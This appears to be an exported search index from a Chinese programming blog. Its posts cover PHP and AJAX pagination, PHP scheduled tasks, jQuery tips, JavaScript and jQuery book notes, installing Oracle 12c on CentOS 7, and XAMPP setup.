&#39029;&#38754;&#26174;&#31034;&#30340;&#26684;&#24335;&#65292;&#26174;&#31034;&#38142;&#25509;&#30340;&#39029;&#25968;&#20026;2*$show_pages+1&#12290;     * &#22914;$show_pages=2&#37027;&#20040;&#39029;&#38754;&#19978;&#26174;&#31034;&#23601;&#26159;[&#39318;&#39029;] [&#19978;&#39029;] 1 2 3 4 5 [&#19979;&#39029;] [&#23614;&#39029;]      */    private $show_pages;    public function __construct($myde_total = 1, $myde_size = 1, $myde_page = 1, $myde_url, $show_pages = 2) {        $this-&gt;myde_total = $this-&gt;numeric($myde_total);        $this-&gt;myde_size = $this-&gt;numeric($myde_size);        $this-&gt;myde_page = $this-&gt;numeric($myde_page);        $this-&gt;myde_page_count = ceil($this-&gt;myde_total / $this-&gt;myde_size);        $this-&gt;myde_url = $myde_url;        if ($this-&gt;myde_total &lt; 0)            $this-&gt;myde_total = 0;        if ($this-&gt;myde_page &lt; 1)            $this-&gt;myde_page = 1;        if ($this-&gt;myde_page_count &lt; 1)            $this-&gt;myde_page_count = 1;        if ($this-&gt;myde_page &gt; $this-&gt;myde_page_count)            $this-&gt;myde_page = $this-&gt;myde_page_count;        $this-&gt;limit = ($this-&gt;myde_page - 1) * $this-&gt;myde_size;        $this-&gt;myde_i = $this-&gt;myde_page - $show_pages;        $this-&gt;myde_en = $this-&gt;myde_page + $show_pages;        if ($this-&gt;myde_i &lt; 1) {            $this-&gt;myde_en = $this-&gt;myde_en + (1 - $this-&gt;myde_i);            $this-&gt;myde_i = 1;        }        if ($this-&gt;myde_en &gt; $this-&gt;myde_page_count) {            $this-&gt;myde_i = $this-&gt;myde_i - ($this-&gt;myde_en - $this-&gt;myde_page_count);            $this-&gt;myde_en = $this-&gt;myde_page_count;        }        if ($this-&gt;myde_i &lt; 1)            $this-&gt;myde_i = 1;    }    //&#26816;&#27979;&#26159;&#21542;&#20026;&#25968;&#23383;    private function numeric($num) {        if (strlen($num)) {            if (!preg_match("/^[0-9]+$/", $num)) {                $num = 1;            } else {                $num = substr($num, 0, 11);            }        } else {            $num = 1;        }        return $num;    }    //&#22320;&#22336;&#26367;&#25442;    private function page_replace($page) {        return str_replace("{page}", $page, $this-&gt;myde_url);    }    //&#39318;&#39029;    private function myde_home() {        if ($this-&gt;myde_page != 1) {            return "&lt;a href='" . $this-&gt;page_replace(1) . "' title='&#39318;&#39029;'&gt;&#39318;&#39029;&lt;/a&gt;";        } else {            return "&lt;p&gt;&#39318;&#39029;&lt;/p&gt;";        }    }    //&#19978;&#19968;&#39029;    private function myde_prev() {        if ($this-&gt;myde_page != 1) {            return "&lt;a href='" . $this-&gt;page_replace($this-&gt;myde_page - 1) . "' title='&#19978;&#19968;&#39029;'&gt;&#19978;&#19968;&#39029;&lt;/a&gt;";        } else {            return "&lt;p&gt;&#19978;&#19968;&#39029;&lt;/p&gt;";        }    }    //&#19979;&#19968;&#39029;    private function myde_next() {        if ($this-&gt;myde_page != $this-&gt;myde_page_count) {            return "&lt;a href='" . $this-&gt;page_replace($this-&gt;myde_page + 1) . "' title='&#19979;&#19968;&#39029;'&gt;&#19979;&#19968;&#39029;&lt;/a&gt;";        } else {            return"&lt;p&gt;&#19979;&#19968;&#39029;&lt;/p&gt;";        }    }    //&#23614;&#39029;    private function myde_last() {        if ($this-&gt;myde_page != $this-&gt;myde_page_count) {            return "&lt;a href='" . $this-&gt;page_replace($this-&gt;myde_page_count) . "' title='&#23614;&#39029;'&gt;&#23614;&#39029;&lt;/a&gt;";        } else {            return "&lt;p&gt;&#23614;&#39029;&lt;/p&gt;";        }    }    //&#36755;&#20986;    public function myde_write($id = 'page') {        $str = "&lt;div id=" . $id . "&gt;";        $str.=$this-&gt;myde_home();        $str.=$this-&gt;myde_prev();        if ($this-&gt;myde_i &gt; 1) {            $str.="&lt;p class='pageEllipsis'&gt;...&lt;/p&gt;";        }        for ($i = $this-&gt;myde_i; $i &lt;= $this-&gt;myde_en; $i++) {            if ($i == $this-&gt;myde_page) {                $str.="&lt;a href='" . $this-&gt;page_replace($i) . "' title='&#31532;" . $i . "&#39029;' class='cur'&gt;$i&lt;/a&gt;";            } else {                $str.="&lt;a href='" . $this-&gt;page_replace($i) . "' title='&#31532;" . $i . "&#39029;'&gt;$i&lt;/a&gt;";            }        }        if ($this-&gt;myde_en &lt; $this-&gt;myde_page_count) {            $str.="&lt;p class='pageEllipsis'&gt;...&lt;/p&gt;";        }        $str.=$this-&gt;myde_next();        $str.=$this-&gt;myde_last();        $str.="&lt;p class='pageRemark'&gt;&#20849;&lt;b&gt;" . $this-&gt;myde_page_count .                "&lt;/b&gt;&#39029;&lt;b&gt;" . $this-&gt;myde_total . "&lt;/b&gt;&#26465;&#25968;&#25454;&lt;/p&gt;";        $str.="&lt;/div&gt;";        return $str;    }}?&gt;2.2 Ajax异步方式CREATE TABLE IF NOT EXISTS `food` (  `id` int(11) NOT NULL AUTO_INCREMENT,  `title` varchar(100) NOT NULL,  `pic` varchar(255) NOT NULL,  PRIMARY KEY (`id`)) ENGINE=MyISAM  DEFAULT CHARSET=utf8;&lt;div id="list"&gt;    &lt;ul&gt;&lt;/ul&gt;&lt;/div&gt;&lt;div id="pagecount"&gt;&lt;/div&gt;var curPage = 1; //&#24403;&#21069;&#39029;&#30721;var total,pageSize,totalPage; //&#24635;&#35760;&#24405;&#25968;&#65292;&#27599;&#39029;&#26174;&#31034;&#25968;&#65292;&#24635;&#39029;&#25968;//&#33719;&#21462;&#25968;&#25454;function getData(page){         $.ajax({                type: 'POST',                url: 'pages.php',                data: {'pageNum':page-1},                dataType:'json',                beforeSend:function(){                        $("#list ul").append("&lt;li id='loading'&gt;loading...&lt;/li&gt;");//&#26174;&#31034;&#21152;&#36733;&#21160;&#30011;                },                success:function(json){                        $("#list ul").empty();//&#28165;&#31354;&#25968;&#25454;&#21306;                        total = json.total; //&#24635;&#35760;&#24405;&#25968;                        pageSize = json.pageSize; //&#27599;&#39029;&#26174;&#31034;&#26465;&#25968;                        curPage = page; //&#24403;&#21069;&#39029;                        totalPage = json.totalPage; //&#24635;&#39029;&#25968;                        var li = "";                        var list = json.list;                        $.each(list,function(index,array){ //&#36941;&#21382;json&#25968;&#25454;&#21015;                                li += "&lt;li&gt;&lt;a href='#'&gt;&lt;img src='"+array['pic']+"'&gt;"+array['title']                +"&lt;/a&gt;&lt;/li&gt;";                        });                        $("#list ul").append(li);                },                complete:function(){ //&#29983;&#25104;&#20998;&#39029;&#26465;                        getPageBar();                },                error:function(){                        alert("&#25968;&#25454;&#21152;&#36733;&#22833;&#36133;");                }        });}//&#33719;&#21462;&#20998;&#39029;&#26465;function getPageBar(){        //&#39029;&#30721;&#22823;&#20110;&#26368;&#22823;&#39029;&#25968;        if(curPage&gt;totalPage) curPage=totalPage;        //&#39029;&#30721;&#23567;&#20110;1        if(curPage&lt;1) curPage=1;        pageStr = "&lt;span&gt;&#20849;"+total+"&#26465;&lt;/span&gt;&lt;span&gt;"+curPage    +"/"+totalPage+"&lt;/span&gt;";        //&#22914;&#26524;&#26159;&#31532;&#19968;&#39029;        if(curPage==1){                pageStr += "&lt;span&gt;&#39318;&#39029;&lt;/span&gt;&lt;span&gt;&#19978;&#19968;&#39029;&lt;/span&gt;";        }else{                pageStr += "&lt;span&gt;&lt;a href='javascript:void(0)' rel='1'&gt;&#39318;&#39029;&lt;/a&gt;&lt;/span&gt;        &lt;span&gt;&lt;a href='javascript:void(0)' rel='"+(curPage-1)+"'&gt;&#19978;&#19968;&#39029;&lt;/a&gt;&lt;/span&gt;";        }        //&#22914;&#26524;&#26159;&#26368;&#21518;&#39029;        if(curPage&gt;=totalPage){                pageStr += "&lt;span&gt;&#19979;&#19968;&#39029;&lt;/span&gt;&lt;span&gt;&#23614;&#39029;&lt;/span&gt;";        }else{                pageStr += "&lt;span&gt;&lt;a href='javascript:void(0)' rel='"+(parseInt(curPage)+1)+"'&gt;        &#19979;&#19968;&#39029;&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&lt;a href='javascript:void(0)' rel='"+totalPage+"'&gt;&#23614;&#39029;&lt;/a&gt;        &lt;/span&gt;";        }        $("#pagecount").html(pageStr);}$(function(){        getData(1);        $("#pagecount span a").live('click',function(){                var rel = $(this).attr("rel");                if(rel){                        getData(rel);                }        });});include_once('connect.php'); //&#36830;&#25509;&#25968;&#25454;&#24211;&#65292;&#30053;&#36807;&#65292;&#20855;&#20307;&#35831;&#19979;&#36733;&#28304;&#30721;&#26597;&#30475;$page = intval($_POST['pageNum']); //&#24403;&#21069;&#39029;$result = mysql_query("select id from food");$total = mysql_num_rows($result);//&#24635;&#35760;&#24405;&#25968;$pageSize = 6; //&#27599;&#39029;&#26174;&#31034;&#25968;$totalPage = ceil($total/$pageSize); //&#24635;&#39029;&#25968;$startPage = $page*$pageSize; //&#24320;&#22987;&#35760;&#24405;//&#26500;&#36896;&#25968;&#32452;$arr['total'] = $total;$arr['pageSize'] = $pageSize;$arr['totalPage'] = $totalPage;$query = mysql_query("select id,title,pic from food order by id asc limit $startPage,$pageSize"); //&#26597;&#35810;&#20998;&#39029;&#25968;&#25454;while($row=mysql_fetch_array($query)){         $arr['list'][] = array(                'id' =&gt; $row['id'],                'title' =&gt; $row['title'],                'pic' =&gt; $row['pic'],         );}echo json_encode($arr); //&#36755;&#20986;JSON&#25968;&#25454;3 Referenceshttps://www.helloweba.net/javascript/195.htmlhttps://zh.wikipedia.org/wiki/%E5%88%86%E9%A0%81https://www.zhihu.com/question/26421527]]></content>
      <categories>
        
          <category> php </category>
        
      </categories>
      <tags>
        
          <tag> PHP-Pages </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[《JavaScript 高级程序设计》读书笔记]]></title>
      <url>/javascript/2015/03/26/professional-javascript/</url>
      <content type="text"><![CDATA[1 写在前面这是一篇通过阅读《JavaScript 高级程序设计》一书记录的笔记。2 关于JavaScript3 JavaScript基本概念4 变量、作用域和内存问题5 引用类型6 面向对象的程序设计7 函数表达式8 BOM9 客户端检测10 DOM、DOM扩展、DOM2、DOM311 事件12 表单脚本13 ]]></content>
      <categories>
        
          <category> javascript </category>
        
      </categories>
      <tags>
        
          <tag> JavaScript </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[PHP 定时任务]]></title>
      <url>/php/2015/03/20/php-timing-task/</url>
      <content type="text"><![CDATA[1 介绍1.1 PHP定时执行的三种方式实现1、windows 的计划任务 2、linux的脚本程序3、定时刷新Web浏览器1.2 定时刷新Web浏览器//首先解决以下几个问题：1、PHP脚本执行时间限制，默认的是30m 解决办法：set_time_limit();或者修改PHP.ini 设置max_execution_time时间（不推荐）2、如果客户端浏览器关闭，程序可能就被迫终止，解决办法：ignore_user_abort即使关闭页面依然正常执行3、如果程序一直执行很有可能会消耗大量的资源，解决办法使用sleep使用程序休眠一会，然后在执行特别说明：由于定时刷新浏览器的方式效率不是很高，建议直接使用脚本方式。&lt;?phpignore_user_abort();//&#20851;&#25481;&#27983;&#35272;&#22120;&#65292;PHP&#33050;&#26412;&#20063;&#21487;&#20197;&#32487;&#32493;&#25191;&#34892;.set_time_limit(3000);// &#36890;&#36807;set_time_limit(0)&#21487;&#20197;&#35753;&#31243;&#24207;&#26080;&#38480;&#21046;&#30340;&#25191;&#34892;&#19979;&#21435;$interval=5;// &#27599;&#38548;5s&#36816;&#34892;//&#26041;&#27861;1--&#27515;&#24490;&#29615;do{    echo '&#27979;&#35797;'.time().'&lt;br/&gt;';     sleep($interval);// &#31561;&#24453;5s    }while(true);//&#26041;&#27861;2---sleep &#23450;&#26102;&#25191;&#34892;(&#25512;&#33616;)require_once './curlClass.php';//&#24341;&#20837;&#25991;&#20214;$curl = new httpCurl();//&#23454;&#20363;&#21270;$stime = $curl-&gt;getmicrotime();for($i=0;$i&lt;=10;$i++){        echo '&#27979;&#35797;'.time().'&lt;br/&gt;';         sleep($interval);// &#31561;&#24453;5s}ob_flush();flush();$etime = $curl-&gt;getmicrotime();echo '&lt;hr&gt;';echo round(($etime-stime),4);//&#31243;&#24207;&#25191;&#34892;&#26102;&#38388;]]></content>
      <categories>
        
          <category> php </category>
        
      </categories>
      <tags>
        
          <tag> PHP-定时任务 </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[jQuery 10个小技巧片段]]></title>
      <url>/javascript/2015/01/15/jquery-ten-skill/</url>
      <content type="text"><![CDATA[1 返回顶部按钮利用animate和scrollTop来实现返回顶部的动画，而不需要使用其他插件。// Back to top$('a.top').click(function () {$(document.body).animate({scrollTop: 0}, 800);return false;});&lt;!-- Create an anchor tag --&gt;&lt;a class="top" href="#"&gt;Back to top&lt;/a&gt;改变scrollTop的值可以调整返回距离顶部的距离，而animae的第二个参数是执行返回动作需要的时间(单位：毫秒)。2 预加载图片如果你的页面中使用了很多不可见的图片（如：hover 显示），你可能需要预加载它们：$.preloadImages = function () {for (var i = 0; i &lt; arguments.length; i++) {$('&lt;img&gt;').attr('src', arguments[i]);}};$.preloadImages('img/hover1.png','img/hover2.png');3 检查图片是否加载完成有时候你需要确保图片完成加载完成以便执行后面的操作：$('img').load(function () {console.log('image load successful');});你可以把img替换为其他的ID或者class来检查指定图片是否加载完成。4 自动修改破损图像如果你碰巧在你的网站上发现了破碎的图像链接，你可以用一个不易被替换的图像来代替它们。添加这个简单的代码可以节省很多麻烦：$('img').on('error', function () {$(this).prop('src', 'img/broken.png');});即使你的网站没有破碎的图像链接，添加这段代码也没有任何害处。5 鼠标悬停(hover)切换 class 属性下面这段代码可以在其悬停在元素上时添加class属性，当用户鼠标离开时，则自动取消该class属性：$('.btn').hover(function () {$(this).addClass('hover');}, function () {$(this).removeClass('hover');});你只需要添加必要的CSS代码即可。如果你想要更简洁的代码，可以使用toggleClass方法：$('.btn').hover(function () { $(this).toggleClass('hover');});注：直接使用CSS实现该效果可能是更好的解决方案，但你仍然有必要知道该方法。6 禁用 input 字段有时你可能需要禁用表单的submit按钮或者某个input字段，直到用户执行了某些操作（例如，检查“已阅读条款”复选框）。可以添加disabld属性，直到你想启用它时：$('input[type="submit"]').prop('disabled', true);你要做的就是执行removeAttr方法，并把要移除的属性作为参数传入：$('input[type="submit"]').removeAttr('disabled');7 阻止链接加载有时你不希望链接到某个页面或者重新加载它，你可能希望它来做一些其他事情或者触发一些其他脚本，你可以这么做：$('a.no-link').click(function (e) {e.preventDefault();});8 切换 fade/slidefade 和 slide 是我们在 jQuery 中经常使用的动画效果，它们可以使元素显示效果更好。但是如果你希望元素显示时使用第一种效果，而消失时使用第二种效果，则可以这么做：// Fade$('.btn').click(function () {$('.element').fadeToggle('slow');});// Toggle$('.btn').click(function () {$('.element').slideToggle('slow');});9 简单的手风琴效果这是一个实现手风琴效果快速简单的方法：// Close all panels $('#accordion').find('.content').hide();// Accordion$('#accordion').find('.accordionheader').click(function () {var next = $(this).next();next.slideToggle('fast');$('.content').not(next).slideUp('fast');return false;});10 让两个 DIV 高度相同有时你需要让两个 div 高度相同，而不管它们里面的内容多少。可以使用下面的代码片段：var $columns = $('.column');var height = 0;$columns.each(function () {if ($(this).height() &gt; height) {height = $(this).height();}});$columns.height(height);这段代码会循环一组元素，并设置它们的高度为元素中的最大高。英文原文：jQuery Tips Everyone Should Know译文地址：http://info.9iphp.com/]]></content>
      <categories>
        
          <category> javascript </category>
        
      </categories>
      <tags>
        
          <tag> jQuery </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[jQuery 权威指南]]></title>
      <url>/javascript/2015/01/13/jquery-definitive-guide/</url>
      <content type="text"><![CDATA[1 jQuery 选择器1.1 实例：隔行变色1.1.1 通过 JavaScript 实现：style:&lt;style type="text/css"&gt;body{font-size: 12px;text-align: center;}#tbStu{width: 260px;border: solid 1px #666;background-color: #eee;}#tbStu tr{line-height: 23px;}#tbStu tr th{background-color: #ccc;color: #fff;}#tbStu .trOdd{background-color: #fff;}&lt;/style&gt;html:&lt;table id="tbStu" cellpadding="0" cellspacing="0"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;th&gt;StudNo&lt;/th&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Sex&lt;/th&gt;&lt;th&gt;Score&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;2016001&lt;/td&gt;&lt;td&gt;Wang San&lt;/td&gt;&lt;td&gt;Man&lt;/td&gt;&lt;td&gt;480&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;2016002&lt;/td&gt;&lt;td&gt;Zhang Si&lt;/td&gt;&lt;td&gt;Woman&lt;/td&gt;&lt;td&gt;510&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;2016003&lt;/td&gt;&lt;td&gt;Zhang Wu&lt;/td&gt;&lt;td&gt;Woman&lt;/td&gt;&lt;td&gt;398&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;js:&lt;script type="text/javascript"&gt;window.onload=function(){var oTb=document.getElementById('tbStu');for (var i = 0; i&lt;oTb.rows.length; i++) {if (i%2) {oTb.rows[i].className="trOdd";}}}&lt;/script&gt;1.1.2 通过 jQuery 实现（样式、html省略）jQuery：&lt;script type="text/javascript"&gt;$(function(){$("#tbStu tr:nth-child(even)").addClass("trOdd");});&lt;/script&gt;1.2 基本选择器#id,element,.class,*,selectorN1.3 层次选择器ancestor descendent，匹配后代元素parent&gt;child，匹配所有子元素prev+next(可以使用.next()代替)，匹配后面紧接的元素prev~sibling(可以使用nextAll()代替)，匹配后面所有元素.siblings()方法与prev~siblings()区别在于，前者获取全部的相邻元素，不分前后。而后者仅获取标记后面全部相邻元素，不能获取前面部分。1.4 简单过滤选择器first() or :firstlast() or :last:not(selector):even，获取所有索引值为偶数的元素。:odd，奇数:eq(index):gt(index):lt(index):header，获取所有标题类型的元素。:animated，获取正在执行动画效果的元素1.5 内容过滤选择器:contains(text)，获取包含给定文本的元素，如果是查找字母，则有大小写的区别。:empty，获取所有不包含子元素或文本为空的元素。:has(selector)，获取含有选择器所匹配的元素。:parent，获取含有子元素或文本的元素。1.6 可见性过滤选择器:hidden:visible，可见元素1.7 属性过滤选择器[attribute]，获取包含给定属性的元素[attribute=value]，获取等于给定的属性是某个特定值的元素[attribute!=value]，获取不等于给定的属性是某个特定值的元素[attribute^=value]，获取给定的属性是以某些值开始的元素[attribute$=value]，获取给定的属性是以某些值结尾的元素[attribute*=value]，获取给定的属性是以包含某些值的元素[selector1][selector2][selectorN]，获取满足多个条件的复合属性的元素1.8 子元素过滤选择器:nth-child(eq|even|odd|index)，获取每个父元素下的特定位置元素，索引号从1开始:first-child，获取每个父元素下的第一个子元素:last-child，获取每个父元素下的最后一个子元素:only-child，获取每个父元素下的仅有的一个子元素1.9 表单对象属性过滤选择器:enabled，可用的元素:disabled，不可用的元素:checked，被选中的元素:selected，被选中option的元素1.10 表单选择器:input，input/texteara/select:text:password:radio:checkbox:submit:image:reset:button:file2 jQuery操作DOM2.1 访问元素2.1.1 attr()，对元素属性执行获取和设置操作获取元素属性格式：            attr(name)元素设置格式：            attr(key,value)            attr(key,function(index))2.1.2 removeAttr()，删除某一指定的属性删除元素属性格式：            removeAttr(name)2.1.3 元素内容操作html(),html(val),text(),text(val)2.1.4 获取或设置元素值val(val)，如果不带参数，则是获取某元素的值；反之，则是将参数val的值赋给某元素，即设置元素的值。可以获取多个选项值：    va().join(",")2.1.5 元素样式操作css(name,value)addClass(class) or addClass(class1 class1...)toggleClass(class)，类别切换removeClass(class)2.2 节点元素操作2.2.1 创建节点元素$(html)eg:var $div=$("&lt;div title="xxx"&gt;Write Less Do More&lt;/div&gt;");$("body").append($div);2.2.2 插入节点内部插入:append(content)append(function(index,html))appendTo(content)prepend(content)prepend(function(index,html))prependTo(content)外部插入：after(content)after(function)before(content)before(function)insertAfter(content)insertBefore(content)2.2.3 复制节点clone(true)2.2.4 替换节点replaceWith(content)replaceAll(selector)2.2.5 包裹节点wrap(html)...2.3 遍历与删除2.3.1 遍历元素each(callback)2.3.2 删除元素remove([expr]empty()3 jQuery事件3.1 事件机制冒泡现象:实际需要中，我们并不希望事件的冒泡现象发生，即单击了按钮就执行单一的单击事件，而不触发其他外围事件。jQuery中通过stopPropagation()方法来实现。event.stopPropagation()也可以通过 return false; 实现停止事件的冒泡过程。3.2 各种事件3.2.1 页面载入事件ready()，类似于js中的OnLoad()方法。OnLoad()方法的执行必须是页面元素的全部加载完成才触发。ready()写法：$(document).ready(function(){//code});$(function(){//code});jQuery(document).ready(function(){//code});jQuery(function(){//code});3.2.2 绑定事件$(function(){ $("#btnShow").click(function(){  //code });});orbind(type,[data],fn)eg:$(function(){ $("#btnBind").bind("click",function(){ //&#32465;&#23450;&#22810;&#20010;&#20107;&#20214;&#65292;&#21487;&#20351;&#29992;&#31354;&#26684;&#32780;&#38548;&#24320;  $(this).attr("disabled","disabled"); });});eg&#65306;&#26144;&#23556;&#26041;&#24335;&#32465;&#23450;$(function(){ $(".txt").bind({focus:function(){   $("#divTip").show();$("#divTip").html("xxx");},   change:function(){$("#divTip").show();$("#divTip").html("xxx");} });});3.2.3 切换事件hover()toggle(fun1,fun2,[fun3,fun4,...])$("a").hover(function(){ //code1 },function(){ //code2});or$("a").mouseenter(function(){ //code1});$("a").mouseleave(function(){ //code2});3.2.4 移除事件unbind([type],[fun])3.2.5 其他事件one(type,[data],fun)，为所选元素绑定一次触发一次的处理函数trigger(type,[data])，在所选的元素上触发指定类型的事件。3.3 表单应用3.4 列表应用3.5 网页选项卡应用4 jQuery动画与特效4.1 显示与隐藏JavaScript：JQuery：5 Ajax与jQuery6 jQuery插件6.1 常用插件6.2 UI插件7 jQuery实用工具函数8 jQuery性能优化与最佳实践9 实例小贴士]]></content>
      <categories>
        
          <category> javascript </category>
        
      </categories>
      <tags>
        
          <tag> jQuery </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[Install Oracle Database 12c On CentOS7]]></title>
      <url>/database/linux/2014/12/14/install-oracle-on-linux/</url>
      <content type="text"><![CDATA[Don't forget to answer the sum up questions in your email message!1 PrefaceIn this tutorial, we will show you how to Install Oracle Database 12c On CentOS 7.2 Environment2.1 OS information[root@1 ~]# cat /etc/centos-releaseCentOS Linux release 7.1.1503 (Core)2.2 Linux Kernel VersionLinux  3.10.02.3 Software VersionOracle 12.1.0‘3 Prepare3.1 Login as root and add required groups/usr/sbin/groupadd -g 501 oinstall/usr/sbin/groupadd -g 502 dba/usr/sbin/groupadd -g 503 oper'3.2 Add user oracle/usr/sbin/useradd -u 502 -g oinstall -G dba,oper oracle3.3 Change password of user:passwd oracle3.4 Add kernel parameters to /etc/sysctl.confkernel.shmmni = 4096kernel.shmmax = 4398046511104kernel.shmall = 1073741824kernel.sem = 250 32000 100 128fs.aio-max-nr = 1048576fs.file-max = 6815744net.ipv4.ip_local_port_range = 9000 65500net.core.rmem_default = 262144net.core.rmem_max = 4194304net.core.wmem_default = 262144net.core.wmem_max = 10485863.5 Apply kernel parameters/sbin/sysctl -p3.6 Add following lines to set shell limits for user oracle in file /etc/security/limits.conforacle   soft   nproc    131072oracle   hard   nproc    131072oracle   soft   nofile   131072oracle   hard   nofile   131072oracle   soft   core     unlimitedoracle   hard   core     unlimitedoracle   soft   memlock  50000000oracle   hard   memlock  500000003.7 Edit /etc/hosts file:[root@1 ~]# cat /etc/hosts127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4::1         localhost localhost.localdomain localhost6 localhost6.localdomain6192.168.120.166 ora-c7.zhao.local3.8 Verify your network setting:ping -c 1 ora-c7.zhao.local3.9 Modify .bash_profile for user oracle in his home directory add at the end file home/oralce.bash_profile.# Oracle Settings#Oracle Settingsexport TMP=/tmpexport TMPDIR=$TMPexport ORACLE_HOSTNAME=O7-unixmenexport ORACLE_UNQNAME=orclexport ORACLE_BASE=/u01/app/oracleexport ORACLE_HOME=$ORACLE_BASE/product/12.1.0/db_1export ORACLE_SID=orclexport PATH=/usr/sbin:$PATHexport PATH=$ORACLE_HOME/bin:$PATHexport LD_LIBRARY_PATH=$ORACLE_HOME/lib:/lib:/usr/libexport CLASSPATH=$ORACLE_HOME/jlib:$ORACLE_HOME/rdbms/jlib3.10 Check which packages are installed and which are missing.as root copy this and excute this:yum groupinstall "GNOME Desktop" -yyum groupinstall "Development Tools" -yyum install binutils -yyum install compat-libstdc++-33 -yyum install compat-libstdc++-33.i686 -yyum install gcc -yyum install gcc-c++ -yyum install glibc -yyum install glibc.i686 -yyum install glibc-devel -yyum install glibc-devel.i686 -yyum install ksh -yyum install libgcc -yyum install libgcc.i686 -yyum install libstdc++ -yyum install libstdc++.i686 -yyum install libstdc++-devel -yyum install libstdc++-devel.i686 -yyum install libaio -yyum install libaio.i686 -yyum install libaio-devel -yyum install libaio-devel.i686 -yyum install libXext -yyum install libXext.i686 -yyum install libXtst -yyum install libXtst.i686 -yyum install libX11 -yyum install libX11.i686 -yyum install libXau -yyum install libXau.i686 -yyum install libxcb -yyum install libxcb.i686 -yyum install libXi -yyum install libXi.i686 -yyum install make -yyum install sysstat -yyum install unixODBC -yyum install unixODBC-devel -yyum install zlib-devel -y3.11 Create directory strucruremkdir -p   /u01/app/oracle/product/12.1.0chown  -R oracle:oinstall /u01/chmod  775 /u01/app3.12 Disable selinux  by editing the “/etc/selinux/config” fileSELINUX=permissiveor SELINUX=disabled4 Start Install database4.1 Let’s start with database software installation as oracle user.su - oracle4.2 Unzip the database install files:unzip linuxamd64_12c_database_1of2.zipunzip linuxamd64_12c_database_2of2.zip [oracle@ora-c7 ~]$ cd  database/4.3 Install./runInstaller!!!This moment,there is a error:This is root...Introducing it in the back section.This does not show the graphical interface for the installation.5 Problem Solving5.1 Error in invoking target '&#x2026;' of makefile 'u01&#x2026;'Solving method:5.2 Oracle Net Configure Assistant failedSolving method&#65306;to: http://linux.linuxidc.com/,user and password is www.linuxidc.comdownload: /2012&#24180;&#36164;&#26009;/8&#26376;/28&#26085;/Oracle 11gR2&#25191;&#34892;DBCA&#25253;&#38169;&#35823; Confirm ORACLE_HOME:echo $ORACLE_HOMECheck perl version:perl -vVerify the OUI Inventory:opatch lsinventory//&#33509;&#27809;&#26377;&#23558;opath&#30340;&#36335;&#24452;&#21152;&#20837;&#21040;oralce&#29992;&#25143;&#30340;PATH&#21464;&#37327;&#20013;&#65292;&#20063;&#21487;&#20197;&#20351;&#29992;&#20197;&#19979;&#21629;&#20196;&#65306;$/u01/app/oracle/product/11.2.0/db_1/OPatch/opatch lsinventory!opatch command is in '$ORACLE_HOME/OPatch/',&#29615;&#22659;&#21464;&#37327;PATH&#20013;&#27809;&#26377;&#21253;&#21547;&#35813;&#30446;&#24405;&#30340;&#35805;,&#30452;&#25509;&#25970;&#20837;opatch&#21629;&#20196;&#26159;&#25552;&#31034;&#25214;&#19981;&#21040;&#25913;&#21629;&#20196;&#30340;,&#36825;&#26102;&#38656;&#35201;&#23558;&#35813;&#30446;&#24405;&#21152;&#20837;&#21040;PATH&#20013;. cd 8670579opatch apply //&#22312;8670579&#19979;&#25191;&#34892;! opatch&#21629;&#20196;&#26159;&#22312;$ORACLE_HOME/OPatch/&#30446;&#24405;&#19979;,&#29615;&#22659;&#21464;&#37327;PATH&#20013;&#27809;&#26377;&#21253;&#21547;&#35813;&#30446;&#24405;&#30340;&#35805;,&#30452;&#25509;&#25970;&#20837;opatch&#21629;&#20196;&#26159;&#25552;&#31034;&#25214;&#19981;&#21040;&#25913;&#21629;&#20196;&#30340;,&#36825;&#26102;&#38656;&#35201;&#23558;&#35813;&#30446;&#24405;&#21152;&#20837;&#21040;PATH&#20013;. 5.3 Oracle Database Configure Assistant failed6 Reference materialhttp://www.tecmint.com/oracle-12c-installation-in-centos-6/http://www.unixmen.com/install-oracle-database-12c-centos-7/http://www.tuicool.com/articles/63mYBjNhttp://blog.itpub.net/25851087/viewspace-1419440/]]></content>
      <categories>
        
          <category> database </category>
        
          <category> linux </category>
        
      </categories>
      <tags>
        
          <tag> Oracle </tag>
        
          <tag> CentOS </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[Apache]]></title>
      <url>/software/web-server/2014/10/25/apache/</url>
      <content type="text"><![CDATA[1 Preface2 一些集成Web开发软件2.1 wamp2.2 WampServer2.3 xampp2.3.1 下载和安装  &#23448;&#32593;&#22320;&#22336;&#65306;https://www.apachefriends.org  &#19979;&#36733;&#26102;&#65292;&#26377;32&#20301;&#30340;&#12289;64&#20301;&#30340;&#65292;&#30475;&#20320;&#30340;&#31995;&#32479;&#25903;&#25345;&#37027;&#20010;&#23601;&#19979;&#21738;&#20010;&#12290;  &#23433;&#35013;&#65306;#./packgeName.run  &#31561;&#24453;&#23433;&#35013;&#32467;&#26463;&#65292;&#26399;&#38388;&#20250;&#25552;&#31034;&#20320;&#26159;&#21542;&#25191;&#34892;&#65292;&#36755;&#20837;y&#21363;&#21487;&#12290;  &#21368;&#36733;&#65306;&#21040;&#23433;&#35013;&#30446;&#24405;/opt/lampp/&#20013;&#25214;&#21040;uninstall&#65292;&#25191;&#34892;&#21363;&#21487;&#21368;&#36733;  